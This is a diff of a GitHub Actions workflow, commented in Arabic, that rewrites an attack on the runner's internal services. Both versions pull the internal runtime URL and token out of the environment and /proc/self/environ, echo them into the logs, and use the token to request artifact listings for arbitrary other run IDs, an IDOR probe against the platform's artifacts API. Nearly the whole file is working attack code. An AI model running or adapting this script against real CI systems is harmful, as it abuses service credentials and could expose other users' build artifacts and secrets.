@@ -1,76 +1,43 @@
-name: Advanced Internal API IDOR V2
+name: Direct API IDOR Test
 on: [push]
 jobs:
   test:
     runs-on: ubuntu-latest
     steps:
-      # 1. إنشاء ملف وهمي لكي تنجح عملية حفظ الكاش وتُحقن المتغيرات
-      - name: Create Dummy Cache File
+      - name: Extract Token and Probe API
         run: |
-          mkdir -p ~/.npm
-          echo "dummy data" > ~/.npm/dummy.txt
-      
-      # 2. حفظ الكاش (هنا سيتم حقن ACTIONS_RUNTIME_TOKEN في الذاكرة)
-      - name: Save Dummy Cache
-        uses: actions/cache@v3
-        with:
-          path: ~/.npm
-          key: ${{ runner.os }}-dummy-${{ github.run_id }}
-      
-      # 3. استخراج التوكن وتنفيذ هجوم IDOR
-      - name: Tamper API Requests for IDOR
-        run: |
-          node -e "
-            const fs = require('fs');
-            const https = require('https');
-
-            // استخراج المتغيرات السرية من ذاكرة الـ Runner
-            const envStr = fs.readFileSync('/proc/self/environ', 'utf8');
-            const envVars = envStr.split('\0');
-            const env = {};
-            for (const pair of envVars) {
-              const idx = pair.indexOf('=');
-              if (idx > 0) env[pair.substring(0, idx)] = pair.substring(idx + 1);
-            }
-
-            const runtimeUrl = env.ACTIONS_RUNTIME_URL;
-            const token = env.ACTIONS_RUNTIME_TOKEN;
-
-            if (runtimeUrl && token) {
-              console.log('Successfully extracted internal token and URL.');
-              
-              // مسارات الـ API الخاصة بالـ Artifacts مع أرقام Run ID عشوائية
-              const idorTargets = [
-                runtimeUrl + '_apis/runs/1/artifacts?api-version=6.0-preview.1',
-                runtimeUrl + '_apis/runs/9999999999/artifacts?api-version=6.0-preview.1',
-                runtimeUrl + '_apis/runs/100000000/artifacts?api-version=6.0-preview.1'
-              ];
-
-              idorTargets.forEach(testUrl => {
-                const parsedUrl = new URL(testUrl);
-                const options = {
-                  hostname: parsedUrl.hostname,
-                  path: parsedUrl.pathname + parsedUrl.search,
-                  method: 'GET',
-                  headers: {
-                    'Authorization': 'Bearer ' + token,
-                    'Accept': 'application/json'
-                  }
-                };
-
-                const req = https.request(options, (res) => {
-                  let data = '';
-                  res.on('data', (chunk) => data += chunk);
-                  res.on('end', () => {
-                    console.log('\\nTarget:', testUrl);
-                    console.log('Status:', res.statusCode);
-                    console.log('Response:', data.substring(0, 300));
-                  });
-                });
-                req.on('error', (e) => console.error('Error:', e.message));
-                req.end();
-              });
-            } else {
-              console.log('Failed to extract internal runtime tokens.');
-            }
-          "
+          # 1. استخراج الروابط والتوكن من بيئة الـ Runner
+          # نطبعها أولاً لنتأكد أنها موجودة في الـ Logs
+          echo "=== Extracting Internal Tokens ==="
+          env | grep -i ACTIONS_
+          
+          RUNTIME_URL=$(env | grep ACTIONS_RUNTIME_URL | cut -d'=' -f2-)
+          TOKEN=$(env | grep ACTIONS_RUNTIME_TOKEN | cut -d'=' -f2-)
+          
+          if [ -z "$RUNTIME_URL" ] || [ -z "$TOKEN" ]; then
+            echo "Tokens not found in standard env, trying memory..."
+            # محاولة أخيرة لقراءته من الذاكرة
+            RUNTIME_URL=$(cat /proc/self/environ | tr '\0' '\n' | grep ^ACTIONS_RUNTIME_URL= | cut -d'=' -f2-)
+            TOKEN=$(cat /proc/self/environ | tr '\0' '\n' | grep ^ACTIONS_RUNTIME_TOKEN= | cut -d'=' -f2-)
+          fi
+          
+          echo "Runtime URL: $RUNTIME_URL"
+          echo "Token Length: ${#TOKEN}"
+          
+          if [ -n "$RUNTIME_URL" ] && [ -n "$TOKEN" ]; then
+            echo "=== Probing Internal API for IDOR ==="
+            
+            # 2. إرسال طلبات IDOR إلى مسارات الـ Artifacts بأرقام Run ID عشوائية
+            for ID in 1 9999999999 100000000; do
+              TARGET_URL="${RUNTIME_URL}_apis/runs/${ID}/artifacts?api-version=6.0-preview.1"
+              echo "Probing: $TARGET_URL"
+              # استخدام curl لضرب الـ API
+              curl -s -o - -w "\nHTTP Status: %{http_code}\n" \
+                   -H "Authorization: Bearer $TOKEN" \
+                   -H "Accept: application/json" \
+                   "$TARGET_URL"
+              echo "-----------------------------------"
+            done
+          else
+            echo "Failed to extract tokens."
+          fi
